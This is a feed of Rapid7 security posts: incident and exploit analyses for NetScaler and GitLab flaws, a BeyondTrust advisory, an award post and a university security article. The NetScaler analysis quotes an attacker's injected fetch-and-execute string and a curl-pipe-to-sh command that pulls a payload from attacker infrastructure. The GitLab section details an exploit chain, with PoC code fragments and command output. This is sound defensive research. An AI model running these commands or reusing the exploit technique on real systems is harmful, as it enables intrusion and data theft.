item.title: Rapid7 Analysis: NetScaler intrusions chaining CVE-2026-88771 and CVE-2026-88779
item.description:
Overview

In early October 2026, Rapid7 analysts investigated a compromise of a Citrix NetScaler ADC appliance. The appliance was running an affected 14.1 build and was exposed to active exploitation targeting NetScaler authentication and SAML deployments.

The intrusion achieved root code execution, deployed multiple persistence mechanisms, installed PHP web shells, created outbound command-and-control and internal tunnelling capabilities, performed targeted reconnaissance of DNS, LDAP/Active Directory, management services and VMware vCenter infrastructure, and exfiltrated NetScaler configuration and key material.

The activity overlaps with public reporting on the WHIPSHOT/SLAPSHOT NetScaler campaign. However, this case provides additional detail on the operational lifecycle, including repeated post-reboot execution through the crash-handling workflow, HA-aware persistence, a dedicated Go reconnaissance tool, a separate FreeBSD proxy agent, and a staged collection pipeline.

Key findings

  • The first confirmed root execution occurred shortly after attacker-controlled text was inserted into a NetScaler authentication username.

  • The injected text caused or immediately preceded repeated nsaaad crashes and a Pitboss reboot.

  • After reboot, the NetScaler call-home crash handler processed the retained attacker-controlled text and executed a payload as root.

  • The attacker installed cookie-authenticated PHP web shells behind CSS-looking Apache aliases.

  • The attacker set /bin/sh to mode 6555, allowing an unprivileged web process to obtain effective root privileges.

  • The implant framework maintained access through cron, rc.netscaler, watchdog loops, an outbound reverse agent, and an HTTP-fronted TCP proxy.

  • HA synchronization and forced failover logic attempted to preserve access across the appliance pair.

  • A Go tool mapped internal routes, DNS, LDAP/AD, management services and VMware vCenter systems. 

  • NetScaler configuration, historical configurations, HTTP configuration, diagnostics and system backup material were staged for exfiltration.

Technical Analysis

Initial access

The first event was an authentication request containing attacker-controlled text similar to:

pitboss PPE unexpectedly died NSPPE;fetch${IFS}-qo${IFS}/v ...;sh${IFS}/v;#

The observed chain was:

Figure 1: Sequence diagram showing the attack chain

Logs collected show attackers chaining CVE-2026-88771, the pre-authentication log-poisoning/RCE issue, with CVE-2026-88779, the separate SAML-parsing crash. A two-vulnerability sequence in which the SAML parsing flaw supplies a crash/reboot condition while the log-poisoning flaw supplies attacker-controlled command text.

The evidence demonstrates more than an attempted chain: the injected command, nsaaad crash loop, Pitboss reboot, post-reboot handler activity, and root payload execution are all directly correlated across independent logs and filesystem timestamps. The first implant files were created at the same second as the first logged post-reboot execution, and later stages, web shells, tunnels, reconnaissance tooling and exfiltration were confirmed.

Rapid7 also published an ETR on the Netscaler zero days currently exploited in the wild.

Repeated post-reboot execution

The initial execution was not a one-time event. The appliance recorded repeated Pitboss-initiated reboots and repeated call-home handler executions over several days.

The handler re-executed stages from multiple infrastructure addresses and the repeated execution model allowed the operator to refresh persistence, deploy new components and continue collection after appliance restarts.

The crash-handling path functioned as a delayed and repeatable execution trampoline, the chaining happened to avoid waiting 24h for the injected payload to run.

Payload evolution

Two .slap dropper versions were recovered:

17447d.sh (earlier version)
SHA-256: a0ba4e1ad622d9c3d950b4156d4430812d05bee216ab22c3804a9f7a80535556

and:

1.sh 
SHA-256: 6774bfed99da38cec82e721de4bd64a67db7840efadcc71e7df02eb6f0a03c44

The later version added reverse-agent functionality, relay installation, HA recovery, stage tracking, and structured upload logging, indicating operational maturation during the campaign.

The nsvmd installer branch was separately identified as:

2.sh / r.sh
SHA-256: 56a892d80096a9db4ca473a9c3109729c60a5ba901d6ba65948bdb1f4a6fb186

Persistence and web shells

The main framework used a directory under /nsconfig/.slap.

/nsconfig/.slap/vc
/nsconfig/.slap/vcscan-agent.sh
/nsconfig/.slap/agent.pl
/nsconfig/.slap/bridge.pl
/nsconfig/.slap/boot.sh
/nsconfig/.slap/reverse-agent.sh

 

It deployed three web shell copies into the LogonPoint custom web directory:

.slap.receiver
.ctxs.receiver
receiver.deb

The shells used a cookie-based command channel. Commands were supplied through a second cookie and returned through an HTTP 404 response body. The 404 response helped the shell blend into normal web traffic and made successful command requests resemble missing resources.

The attacker modified Apache configuration to:

  • execute .deb files as PHP;

  • enable PHP execution;

  • map CSS-looking URLs to .slap.receiver;

  • accept randomized hexadecimal CSS suffixes;

  • preserve an attacker backup of the HTTP configuration.

The alias created were the following:

/logon/LogonPoint/custom/receiver.v2.min.css
/logon/LogonPoint/custom/receiver.v2.min.<hex>.css
        ↓
/var/netscaler/logon/LogonPoint/custom/.slap.receiver

TA repeatedly set:

chmod 6555 /bin/sh

This made the shell setuid and setgid. Because Apache normally runs with reduced privileges, this provided a path for the PHP web shell to obtain effective root privileges.

The framework also reseeded cron entries and boot hooks whenever it ran. This made the compromise resilient to reboots, image regeneration and loss of individual cron entries.

Tunnelling and command channels

The intrusion deployed multiple redundant access paths.

Perl TCP session manager

agent.pl created a loopback listener on an ephemeral port and recorded it in /tmp/.uxdport

It used /tmp/.uxdlock for process coordination and supported operations including:

ping
open
push
pull
exch
close

The open operation accepted arbitrary destination hosts and ports, turning the NetScaler into an internal TCP pivot.

Python HTTP tunnel

The Python components provided a local session manager and HTTP front end:

it accepted base64 commands in an HTTP header and returned tunnel responses in HTTP 404 bodies. This behavior overlaps with publicly reported WHIPSHOT/SLAPSHOT tooling.

Outbound reverse agent

The reverse agent polled an external command endpoint every 15 seconds, executed the received command with /bin/sh -c, and returned output using HTTP PUT. This gave the operator command execution without requiring an inbound connection to the appliance.

HA-aware persistence

The framework included explicit HA recovery logic:

sync HA files all
force HA failover

The code attempted to synchronize implant files to the HA peer and, when appropriate, force failover so the node containing the implant became active.

Internal reconnaissance

A stripped, statically linked FreeBSD Go binary was recovered from the .slap directory. The tool was designed to map infrastructure reachable from the compromised appliance.

It contains functionality associated with:

  • local interface and route parsing;

  • gateway-prefix discovery;

  • subnet expansion;

  • DNS server and domain discovery;

  • DNS zone-transfer hunting;

  • LDAP anonymous bind and RootDSE queries;

  • LDAP searches;

  • management-service checks;

  • TLS certificate inspection;

  • VMware vCenter classification.

A launcher named vcscan-agent.sh downloaded and validated the scanner as scanner-freebsd-amd64, installed it as /nsconfig/.slap/vc, and ran two stages: broad scanning of RFC1918 space and management-focused scanning of ranges derived from DNS and LDAP results. The launcher collected route, DNS, LDAP, management and vCenter results into files such as:

vcpersist-<token>_dns_candidates.tsv
vcpersist-<token>_dns_ldap_verified.tsv
vcpersist-<token>_vcenter_verified_all.txt

It then compressed and uploaded the results to the operator infrastructure.

This reconnaissance component addition confirms the campaign is active and developing, mapping the identity, management and virtualization infrastructure from a compromised ADC vantage point.

nsvmd proxy

The second payload branch deployed a FreeBSD Go agent named nsvmd through injection of 2.sh/r.sh under /flash/.nsvm/nsvmd:

curl${IFS}-sSLk${IFS}https://v5v.in/r.sh?k=<token>|sh

The agent was started with:

nsvmd -server v5v.in:443 -sni c.v5v.in

The installer created a 45s watchdog (/flash/.nsvm/watchdog.sh), boot persistence through /nsconfig/rc.netscaler, 5 minute and daily cron persistence (/flash/.nsvm/guard.sh,/flash/.nsvm/restart.sh) marking nsvmd immutable using chflags uchg. Agent logs were collected under /flash/.nsvm/.agent.log and /flash/.nsvm/.wd.log.

Configuration and key-material collection

The attacker staged and uploaded:

/nsconfig/
ns.conf.0 through ns.conf.4
ns.conf.bak
/etc/httpd.conf
system backup archives
implant diagnostics

The configuration archive could contain encrypted credentials, LDAP/RADIUS bind information, administrative configuration, SSL private keys and key-encryption material. The collection logic also uploaded manifests and stage logs and retried failed uploads.

A separate archive was staged in the web root and successfully downloaded through an HTTP 200 request. The response size matched the staged archive size, providing direct evidence of configuration exfiltration through the web interface.

Defensive recommendations

  • Patch NetScaler appliances to the applicable CVE-2026-88779 and CVE-2026-88771 fixed builds and verify the earlier CTX697096 fixes.

  • Treat Internet-facing appliances as potentially compromised if they were vulnerable during the campaign window.

  • Collect volatile evidence before rebooting or rebuilding when compromise is suspected.

  • Inspect both nodes of every HA pair.

  • Hunt for the .slap, .relay and .nsvm paths.

  • Hunt for setuid /bin/sh, unauthorized Apache PHP handlers and CSS-looking aliases.

  • Search for nsaaad crashes, Pitboss reboots and ns_monuploadd_err.pl execution records.

  • Rotate all credentials and keys exposed through /nsconfig, including LDAP/RADIUS credentials and encryption-related material.

  • Review outbound traffic for the listed infrastructure and internal scanning from NetScaler source addresses.

Conclusion

This incident demonstrates how a NetScaler compromise can evolve from a pre-authentication injection into a persistent appliance-resident intrusion platform. The attacker combined web shells, setuid privilege persistence, outbound command execution, internal TCP tunnelling, HA manipulation, environment reconnaissance and automated configuration exfiltration.

The most significant new findings are the observed chaining of CVE-2026-88779 and CVE-2026-88771 and the dedicated reconnaissance workflow. Rather than using the ADC only as a foothold, the operator used it as a privileged vantage point to map internal networks, identity services, management infrastructure and virtualization systems. This provides defenders with additional high-value hunting opportunities and shows why patching alone is insufficient after an Internet-facing NetScaler has been exposed to active exploitation.

item.title: CVE-2026-102764: Critical BeyondTrust Remote Support Authentication Bypass Exploited in the Wild
item.description:
Overview

On October 15, 2026, BeyondTrust disclosed a critical authentication bypass in Remote Support (RS), its platform for remotely troubleshooting and administering endpoints. Tracked as CVE-2026-102764 and assigned a CVSSv4 score of 9.3, the vulnerability allows unauthenticated remote attackers to perform file operations on an affected appliance without user interaction. Versions 26.2.3 and earlier are affected unless the BT26-05-RS patch has been applied.

BeyondTrust has confirmed that exploitation in the wild has already occurred prior to disclosure. Its October 16 report dates the two known Remote Support compromises to August 29, 2026: one BeyondTrust-hosted instance and one self-hosted appliance. BeyondTrust discovered and contained the hosted compromise on September 28; Mandiant shared corroborating findings from the self-hosted investigation on September 30.

On October 16, 2026, CVE-2026-102764 was added to the U.S. Cybersecurity and Infrastructure Security Agency's (CISA) list of known exploited vulnerabilities (KEV), based on evidence of active exploitation. CISA's official KEV feed lists an October 19, 2026 due date and marks forensic triage as required. Rapid7 recommends remediating affected appliances on an emergency basis and investigating RS appliances for prior compromise.

BeyondTrust's remote access products have previously been targeted earlier this year. Rapid7 covered CVE-2026-1731, which was added to KEV in February 2026.

Technical overview

According to the vendor's CVE record, internal Remote Support components inadequately validate the origin of incoming messages, permitting file operations on the appliance. The flaw is classified as authentication bypass by spoofing (CWE-290). BeyondTrust is withholding exploitation details while customers apply patches.

Mandiant's investigation describes arbitrary file uploads, deployment of the SAWFLY PHP web shell and BARECLAW tunneler, root escalation, attempted credential-vault extraction, persistence, and log deletion. Mandiant attributes the activity to ARMORY CASTLE, a suspected PRC-nexus espionage actor formerly tracked as UNC5221.

On October 30, 2026, Rapid Intelligence published a technical analysis demonstrating unauthenticated file upload leading to remote code execution as the site user. A Metasploit exploit module is also available.

Mitigation guidance

A vendor-provided patch is available. Rapid7 strongly recommends that organizations running affected self-hosted Remote Support appliances apply it on an emergency basis, outside of normal patching cycles.

Per BeyondTrust's advisory:

  • Affected versions: Remote Support 26.2.3 and earlier, unless the patch has been applied.

  • Remediation: Apply the BT26-05-RS patch, available for versions 24.3.1 through to26.2.3.

  • Older deployments: Instances older than 24.3.1 require an upgrade to a patch-supported version followed by application of the patch.

  • Self-hosted deployments: Confirm installation through the /appliance interface. Apply the patch manually if automatic updates are not enabled.

  • SaaS deployments: BeyondTrust states that all Remote Support SaaS customers were patched as of October 9, 2026.

Note: BeyondTrust also recommends immediate patching of self-hosted Privileged Remote Access (PRA) because it shares the affected code. The vendor has not identified a way to exploit this vulnerability in PRA. PRA customers should confirm the appropriate patch with BeyondTrust Support.

Rapid7 strongly recommends investigating for compromise even after patching. Mandiant recommends preserving evidence before changes or reboots, isolating suspected appliances, and rebuilding from a clean, fully patched image if compromise is confirmed or cannot be ruled out. Organizations should rotate stored or brokered credentials after patching or rebuilding, and review administrative changes and downstream sessions. Credential and configuration reviews also apply to SaaS customers. Patching does not remove persistence.

For the latest mitigation guidance, please refer to the vendor's security advisory.

Artifacts, evidence sources, and IOCs

BeyondTrust recommends hunting for the following behaviors:

  • Unrecognized administrative sessions from residential broadband or commercial VPN addresses.

  • Unexpected scripts in web directories or shells spawned by web service accounts.

  • Unauthorized account, permission, or session-policy changes, particularly to Jump Items or Teams.

  • Gaps in log forwarding bounded by a single session.

The vendor cautions that infrastructure and tooling vary between victims; an absence of known indicators does not establish that an appliance is uncompromised. BeyondTrust customers can request an additional hunting package through its trust portal.

Organizations should forward appliance events to an external SIEM using BeyondTrust's syslog guidance and preserve existing external logs. Enabling forwarding now cannot recover previously deleted evidence.

Mandiant identified evidence in access, syslog, messages, thin-scc, brain, and SSL logs. Customers should coordinate host-level log and artifact inspection with BeyondTrust Support; they cannot audit the appliance host filesystem.

Mandiant's report includes the file indicators below and separate YARA rules:

Exposure Command, Vulnerability Management, and Nexpose customers can assess exposure to CVE-2026-102764 with an authenticated vulnerability check expected to be available in the October 20 content release.

item.title: Rapid7 Analysis: GitLab CI/CD Regex Integer Overflow (CVE-2026-97229)
item.description:
Overview

On October 12, 2026, GitLab released 19.4.2, 19.3.5, and 19.2.8 to fix CVE-2026-97229, an integer overflow in its CI/CD regular-expression handling. The issue was reported through HackerOne by joaxcar. GitLab assigned it a CVSS score of 10.0 and described possible code execution by an unauthenticated user.

The advisory states that CVE-2026-97229 affects GitLab CE and EE from 19.2 before 19.2.8, 19.3 before 19.3.5, and 19.4 before 19.4.2. GitLab says all deployment types are affected unless stated otherwise. GitLab.com was patched before disclosure, and Dedicated customers do not need to act.

Rapid7 researchers developed an end-to-end PoC that reliably runs arbitrary commands as GitLab's git operating-system account on the official Linux amd64 gitlab/gitlab-ce:19.4.1-ce.0 image with ASLR enabled. GitLab's release notes do not report exploitation in the wild occurring at the time of disclosure.

This analysis covers one end-to-end route. It begins after an attacker has pushed both the malicious CI configuration and a specially named path to a public project; only the final CI lint request is unauthenticated. That prerequisite conflicts with GitLab's PR:N rating, and because the underlying report remains private, we do not yet know how the reported attack avoids it.

Technical analysis

At a high level, the chain crosses from attacker-controlled repository input into Onigmo pcode and finally native code execution.

CI rules pass repository paths to Onigmo

GitLab supports regular-expression matching over repository paths in rules:exists:regexp and rules:changes:regexp. One way to evaluate such an expression during static configuration processing is to place it on a conditional include:

include:
  - local: /benign.yml
    rules:
      - exists:
          regexp: "ATTACKER_PATTERN"

RegexpMatcher expands the expression, compiles it with Ruby's native regular-expression engine, and tests it against paths from the selected Git worktree:

# Exists#regexp_match?()
def regexp_match?(context)
  matcher = regexp_matcher(context)  matcher.validate_pattern_length! # [0] Source-length check

  Gitlab::SafeRequestStore.fetch(regexp_comparison_key(context, matcher.expanded_pattern)) do
    # ... top-level optimisation omitted
    matcher.match?(worktree_paths(context, false)) # [1] Repository paths
  end
end

# RegexpMatcher#match?()
def match?(paths)
  # ... path-count fail-open handling omitted
  pattern = compile_pattern # [2] Compile regexp
  deadline = current_monotonic_time + REGEXP_TOTAL_TIMEOUT_SECONDS

  paths.any? do |path|
    # ... total-budget check omitted
    pattern.match?(path) # [3] Native match
    # ... per-match timeout handling omitted
  end
end

By the time execution reaches [0], GitLab is checking only the length of the expanded source expression. The call at [1] supplies every filename in the selected commit, while compile_pattern at [2] ultimately invokes Regexp.new. Each iteration at [3] therefore crosses from CI configuration into native Onigmo with a repository path as the match subject.

Smuggling a large repeat through the checks

GitLab places several sensible limits around CI regular expressions. The interesting parts of its wrapper are shown below:

REPEAT_BOUND = /(?<!\\)(?:\\\\)*\{\s*(\d+)\s*(?:,\s*(\d+)?\s*)?\}/ # [4] Repeat scanner

def self.compile_regexp(pattern, timeout: nil)
  raise RegexpError, 'uses a subroutine call (\g), which is not allowed' if SUBROUTINE_CALL.match?(pattern) # [5] Subroutine-call check
  reject_large_repeats!(pattern) # [6] Repeat-bound check

  alternation_free = pattern.gsub(ESCAPE_OR_ALTERNATION) { |token| token == '|' ? '\\|' : token }

  probe =
    begin
      Regexp.new(alternation_free)
    rescue RegexpError => e
      # ... error-message rewriting omitted
    end

  check_compiled_size!(probe) # [7] Probe size check
  check_compiled_size!(Regexp.new(pattern, timeout: timeout)) # [8] Final size check
end

The source-length check occurs before this function. The subroutine-call check at [5] and the repeat-bound check at [6] defend against structural growth, but the scanner at [4] recognizes only contiguous digits. Compilation then happens twice: [7] checks an alternation-free probe, and [8] checks the requested expression and attaches the 50-millisecond timeout. Either object is rejected if it exceeds one megabyte.

The PoC hides its quantifier bound from the scanner at [4] via an inline comment: {5(?#)7805}

(?#) is an inline regex comment. Onigmo ignores it and reads the bound as 57,805. GitLab's scanner expects contiguous digits, so it does not see a bound above 1,000.

That bypass admits the large repeat, but the checked expression is still only 986 bytes. The six [[:word:]] classes expand when matching begins against a repository path containing valid four-byte UTF-8 characters. Ruby recompiles the same source for UTF-8, each POSIX word class expands into a large Unicode range table, and GitLab never checks the size of this new program.

Ruby selects or recompiles the regex before starting its timed matcher:

/* re.c: rb_reg_prepare_re() */
regex_t *reg = RREGEXP_PTR(re);
if (reg->enc == enc) return reg; // [9] Matching encoding

// ... source preprocessing and use-count branch omitted
r = onig_new_without_alloc(&tmp_reg, (UChar *)ptr, (UChar *)(ptr + len),
                           reg->options, enc,
                           OnigDefaultSyntax, &einfo); // [10] Onigmo recompile
// ... error handling and old-program replacement omitted

/* re.c: rb_reg_onig_match() */
reg = rb_reg_prepare_re(re, str);
// ... use-count bookkeeping omitted
OnigPosition result = match(reg, str, regs, args); // [11] Begin timed match
// ... result cleanup omitted

At [9], Ruby returns the existing program only when its encoding matches the subject. Otherwise, [10] recompiles the source for the subject encoding via Onigmo. Only then does [11] begin timed matching, leaving the unsafe compilation outside the timeout.

Onigmo compiles the regular expression into bytecode, which its source calls pcode. Its regex VM then runs that pcode against each path, so the UTF-8 recompilation at [10] is where the oversized pcode program is created.

The repeated target also carries the bytes that run after the overflow:

# poc.py: build()
# ... prefix setup omitted
target = "(?<=" + "[[:word:]]" * 6 + "".join(character_class(stage) for stage in STAGES)
digits = str(REPEAT_COUNT)
pattern = f"\\A(?>{prefix}(?:{target}){{{digits[0]}(?#){digits[1:]}}}|)\\b\\B"

The six [[:word:]] classes are only the size multiplier. The payload sits in four more character classes generated by character_class(stage). A class such as [abc] compiles to a bitmap with bits set for a, b, and c. The helper works backwards from each desired pcode sequence and chooses class members whose bitmap reproduces those bytes. This puts attacker-controlled VM instructions at the end of every expanded copy.

Crossing INT_MAX

Under UTF-8, one copy of the repeated body is 37,151 bytes. The relevant Onigmo compiler code in Ruby 3.3.12 is:

/* regcomp.c: compile_quantifier_node() */
/* ... earlier quantifier cases omitted */
else if (!infinite && qn->greedy &&
         (qn->upper == 1 || (tlen + SIZE_OP_PUSH) * qn->upper
                                <= QUANTIFIER_EXPAND_LIMIT_SIZE)) { // [12] Signed size check
int n = qn->upper - qn->lower;

  r = compile_tree_n_times(qn->target, qn->lower, reg); // [13] Expand lower copies
if (r) return r;

// ... optional copies omitted
}
/* ... remaining quantifier cases omitted */

With this body size (37,151) and quantifier bound (57,805):

37,151 × 57,805 = 2,147,513,555 = 0x800074d3

That is 29,908 (0x74D4) bytes beyond signed INT_MAX (0x7FFFFFFF). At [12], the negative result satisfies the compiler's “small enough to expand” test. Onigmo enters the expansion path at [13] and emits all 57,805 copies.

The | immediately after {5(?#)7805} makes the repeated body the first alternative and leaves the second alternative empty. Onigmo compiles this | into two pcode branches. An OP_PUSH near the beginning is meant to record the empty alternative as a backtracking target, but does not transfer execution on this path. The first bad transfer is the OP_JUMP emitted after the giant first alternative by the alternation compiler:

/* regcomp.c: compile_tree(), NT_ALT */
/* ... calculate alternation length omitted */
pos = reg->used + len;  /* goal position */

/* ... emit the fallback and first alternative omitted */
if (IS_NOT_NULL(NCDR(node))) {
  len = pos - (reg->used + SIZE_OP_JUMP);
  r = add_opcode_rel_addr(reg, OP_JUMP, len); // [14] Skip empty branch
if (r) break;
}

The jump at [14] should skip the empty alternative and land at the end of the alternation. The compiler calculated pos from the already wrapped length, however. Our build emits the jump at offset 2,147,513,698 with a displacement of -136, sending execution into the first payload bitmap in the last expanded copy, 140 bytes from the end of the pcode.

From character-class bitmap to system()

The wrapped branch now leaves normal generated pcode and enters a controlled character-class bitmap. Onigmo consequently runs the bytes encoded by character_class() as VM instructions, starting the sequence shown here.

The controlled pcode redirects Onigmo's backtracking stack, which holds saved match state, into the repository path. On a failed match, the VM restores the two values shown in the diagram: the next instruction from the path and FinishCode, a pointer from its bottom stack frame. The first value decides where controlled pcode resumes. The second gives it a known address inside libruby.

The path instruction sends control to the final controlled bitmap. That bitmap adjusts the recovered libruby pointer to a short instruction sequence that passes the path command to system(), then writes that address into match_at()'s native return slot. When the matcher finishes, execution returns through the overwritten slot. FinishCode and the call site are in the same libruby mapping, so the distance between them stays constant under ASLR.

Exploitation

Delivering the branch through CI lint

Once the malicious configuration and path are present on a public branch, GitLab's CI lint API supplies an unauthenticated trigger. The GET form accepts an attacker-selected content_ref, loads .gitlab-ci.yml from that commit, and evaluates it:

GET /api/v4/projects/attacker%2Fpublic-project/ci/lint?content_ref=payload-ref
Host: gitlab.example

The route checks whether the requester may read the public repository, resolves the supplied ref, and passes its CI configuration to the static linter:

get ':id/ci/lint' do
  authorize_read_code! # [17] Read authorization
  not_found! 'Repository' if user_project.empty_repo?

  unauthorized!("This endpoint requires an API authentication") if current_user && !::Current.token_info # [18] Token check

  content_ref = params[:content_ref] || params[:sha] || user_project.repository.root_ref_sha # [19] Select commit
  dry_run_ref = params[:dry_run_ref] || params[:ref] || user_project.default_branch

  commit = user_project.commit(content_ref)
  not_found! 'Commit' unless commit.present?

  content = user_project.repository.blob_data_at(commit.sha, user_project.ci_config_path_or_default)
  result = Gitlab::Ci::Lint
    .new(project: user_project, current_user: current_user, sha: commit.sha)
    .legacy_validate(content, dry_run: params[:dry_run], ref: dry_run_ref) # [20] Run static lint

  present result, with: Entities::Ci::Lint::Result, current_user: current_user, include_jobs: params[:include_jobs]
end

Public visibility makes authorize_read_code! at [17] succeed without credentials, while the condition at [18] does not reject an absent current_user. The selected branch becomes the static linter's input through [19] and [20], without creating a pipeline or contacting a runner. This is why the exploit's trigger can be unauthenticated even though the demonstrated setup requires project write access.

Running a command

The initial Python PoC clones a public project controlled by the operator, creates a payload branch, starts the callback, and sends the lint request:

$ python3 poc.py https://g.example 123 \
    --git-url 'https://oauth2:ATTACKER_TOKEN@g.example/attacker/public-poc.git' \
    --callback-url cb.ex:8000 \
    --cmd 'uname -a && id'
[*] deployed attacker ref 69fe2478c446ab17afe4c150; executing: uname -a && id
[*] delivery GET https://g.example/api/v4/projects/123/ci/lint?content_ref=69fe2478c446ab17afe4c150
[*] target stopped responding after delivery: HTTP Error 502: Bad Gateway
[uname output omitted]
uid=998(git) gid=998(git) groups=998(git)

HTTP 502 is expected. The command runs synchronously in a Puma worker. After system() returns, the corrupted worker crashes. GitLab Workhorse, the reverse proxy in front of Puma, sees its Rails backend connection close and returns 502. Puma replaces the worker. The callback output, not the HTTP status, is the success signal.

The target-specific values in this PoC, such as SYSTEM_STEP_COUNT, the number of UTF-8 backward steps from FinishCode to the libruby system() call site, match official GitLab CE 19.4.1 on Linux amd64. Other vulnerable packages or architectures need adjusted pcode and libruby offsets. A little over 2 GiB is required in the worker, and our complete single-node GitLab target needed about 9 GiB available. Low-memory instances may swap, reject the allocation, or invoke the OOM killer.

The fix

GitLab's Ruby backport replaces the multiplication at [12] with a division-based test, which cannot overflow, and rejects compiled programs above roughly 512 MiB:

/* regcomp.c */
#define IS_EXPAND_LIMIT_OK(tlen, n) \
  ((n) <= 0 || (tlen) <= QUANTIFIER_EXPAND_LIMIT_SIZE / (n))

/* ... unrelated compiler declarations omitted */
#define MAX_COMPILED_PROGRAM_SIZE (INT_MAX_LIMIT / 4)

On the patched image, the crafted quantifier remains a compact loop and the request returns a normal false match. The repeat-range double-free fixed in the same release affects an error path and is not part of this chain.

Detection guidance

For the exploitation strategy described in this analysis, correlate:

  1. /var/log/gitlab/gitlab-workhorse/current: a several-second GET /api/v4/projects/<project>/ci/lint?content_ref=<ref>, badgateway: failed to receive response: EOF, and HTTP 502.

  2. A Puma worker crashes or restarts at the same time; any saved trace contains regexp_matcher.rb.

  3. The referenced commit: an (?#)-split repeat, repeated POSIX word classes, and a path containing four-byte UTF-8 characters.

A shell child or roughly 2 GiB worker-memory increase strengthens the match. The undisclosed path may differ.

Mitigation guidance

Self-managed GitLab customers should upgrade to the fixed patch for their release: 19.2.8, 19.3.5, or 19.4.2. As a temporary measure, restrict credential-free access to attacker-writable public projects or block this lint route. Route controls do not repair the vulnerable Ruby compiler.

Please read GitLab's critical patch release for the latest guidance.

item.title: Rapid7 Intelligence Wins the 2026 Péter Szőr Award for Outstanding Research
item.description:
Some awards you're happy to receive, while others make you stop for a moment. Receiving the 2026 Péter Szőr Award this week at Virus Bulletin in Seville for our research, BPFdoor in Telecom Networks: Sleeper Cells in the Backbone, was of the latter kind.

Virus Bulletin created the award to honor Péter's life and work, and it recognizes outstanding technical security research: the rigorous, the deep, and the useful – exactly what he was known for himself. And as far as recognitions in our industry go, it's hard to top. I'm extremely proud.

What the Pèter Szőr Award means to us

I knew Péter, and early in my career, I learned from him. This was back when malware analysis meant staring at assembly, arguing about what a routine really did, and realizing hours later that your first theory was wrong. One memory came straight back when I heard about the award: going through Stuxnet together. For anyone in research at the time, that was the moment you knew the game had changed. Engineering, tradecraft, espionage and physical-world consequences, all in one package.

What stayed with me wasn't how much Péter knew, but rather his curiosity. He wanted to understand things, and then once he did, he wanted everyone else to understand too. Plenty of brilliant people in cybersecurity keep it to themselves, but the ones who leave a legacy make the people around them better.

Receiving an award that carries his name felt like one of those full-circle moments. 

The research behind the award

The original research from Rapid7 Intelligence emerged after months of investigating stealthy access inside telecommunications environments. This wasn't malware dropped during a conventional intrusion, but long-term strategic positioning: passive backdoors, kernel-level capabilities and covert access, quietly settled into critical infrastructure and in no hurry whatsoever.

Telecom networks carry our communications, our identities and, increasingly, everything governments and businesses run on. So when an adversary sets up camp there, the impact goes well beyond one compromised machine or one unlucky company.

Virus Bulletin's community nomination noted that the work paired deep technical investigation with real-world impact, including long hours with agencies and CERTs around the world and tools, scripts, intelligence and detection capabilities for defenders. That's the part I'm happiest about, as this wasn't research for publication alone. Remember that a PDF has never stopped an intrusion.

Publishing research is a checkpoint, not the finish line

We're still doing the research. Since the original report, Rapid7 Intelligence has analyzed hundreds more samples, found previously undocumented BPFDoor variants, and tracked changes in the operators' tradecraft. Our follow-up work covered new httpShell and icmpShell variants built to make detection even harder. In further publications, we went beyond BPFDoor to additional Linux implants and infrastructure targeting telecom and network-edge environments, including AVERAT and techniques that hide in ordinary-looking traffic like SMTP. 

That's how this work goes. You find something, you share it, someone sends you another sample, a CERT spots something in their environment, an analyst notices the one odd function nobody looked at twice, and you're back down the rabbit hole. Anyone who thinks an initial report is the finish line has never received "just one more sample" at 4 p.m. on a Friday.

And truthfully, I also love that this happens in the open. From the outside, our industry looks like a cage match over attribution, naming conventions and whose acronym is cooler. But when something truly matters, researchers, vendors, CERTs and governments put that aside and share, because protecting people beats winning the naming argument.

This award belongs to the team: Rapid7 Intelligence

Research like this never belongs to just one or two people. It belongs to the analysts still staring at code after everyone else has gone home, the people who question an assumption because something doesn't add up, the people that keep the show running, and the detection engineers who turn findings into something defenders can use. It also belongs to the people collecting samples, maintaining infrastructure and correlating intelligence, and to the CERTs, agencies and peers who trusted us enough to share what they saw.

I'm proud of the Rapid7 Intelligence team, and not because of the trophy. I'm proud of why we got it: we took a hard problem, did the hard work, and then tried to make the result useful to someone else.

To the next generation of research

Today, the conversation has evolved to include autonomous agents, AI-generated malware and machine-speed attacks. Tomorrow it'll be something new. My motivation stays the same: I want to leave the digital world a little safer for the generations that come after us.

Somewhere right now, a young researcher is opening a debugger for the first time and wondering how on earth the thing works. Someone will investigate the Stuxnet of their generation, and someone will eventually sit in the chair I'm in now. Our job isn't just to detect today's attacks. It's to share what we learn, build tools, mentor people and make sure they start a few steps ahead of where we did.

Péter did that for our industry, and he did it for me.

Thank you to Virus Bulletin and our peers in the security community for this recognition, to everyone who contributed to the research, publicly or behind the scenes, and to Péter, who taught a young malware researcher that taking things apart is only half the job. The other half is making sure somebody else can learn from what you found.

item.title: How Multi-Campus Universities can Build a more Connected Security Program
item.description:
Parts 1 and 2 of this series looked at two pressures facing higher education security teams. First, the threat landscape: universities are dealing with more frequent attacks across complex, distributed environments, while campus-by-campus security can make it harder to share intelligence and coordinate response. Second, the compliance burden: overlapping requirements across FERPA, GLBA, HIPAA, and CMMC make it difficult to establish what data was affected, which reporting obligations apply, and how quickly the institution needs to act.

This final part is about what changes when a university system starts treating security as a shared capability rather than a collection of separate campus programs. Multi-campus institutions still need to preserve local autonomy, but they also need enough visibility across the wider organization to understand where risk sits, how an incident is spreading, and whether the same problem is appearing elsewhere.

That balance is especially relevant in higher education, where campuses, research environments, health services, and administrative teams often operate with very different technology needs and levels of independence.

Security architecture should reflect how universities actually operate

Most university systems are already federated organizations, with individual campuses managing their own leadership, budgets, users, and technology environments while a central office provides governance and oversight across the wider institution.

Security architecture can follow the same model. With multi-tenancy in the Rapid7 Command Platform, a central security team can maintain visibility across the university system while individual campuses continue to operate within their own environments. Campus-level data and access remain separated, while the central team can identify wider patterns, coordinate response, and distribute common workflows across the system.

A new attack pattern detected at one campus, for example, should not have to remain a local discovery. Shared visibility and coordinated workflows can help the central team determine whether the same activity is appearing elsewhere and make relevant response guidance available across the institution without exposing one campus's data to another.

As the university system grows, that model can expand with it. A system operating three campuses today can add new environments without redesigning the security architecture each time.

Shared visibility makes cross-campus response faster

A central view of the attack surface can reduce much of the manual work that happens when university teams need to answer a system-wide security question.

If a significant zero-day is disclosed, the central security team needs to know which campuses are running affected systems, which have already remediated the vulnerability, and where attention is still required. In a decentralized environment, gathering that information can mean emails, calls, spreadsheets, and separate conversations with each campus. A shared view of assets and vulnerabilities gives teams a faster way to establish where the exposure exists.

During an active incident, the same cross-campus visibility can help investigators work out whether suspicious activity first appeared at Campus C because the compromise began there, or because that is simply where it became visible. It also allows them to check whether the same indicators are present at Campus A or Campus B before each team starts investigating independently.

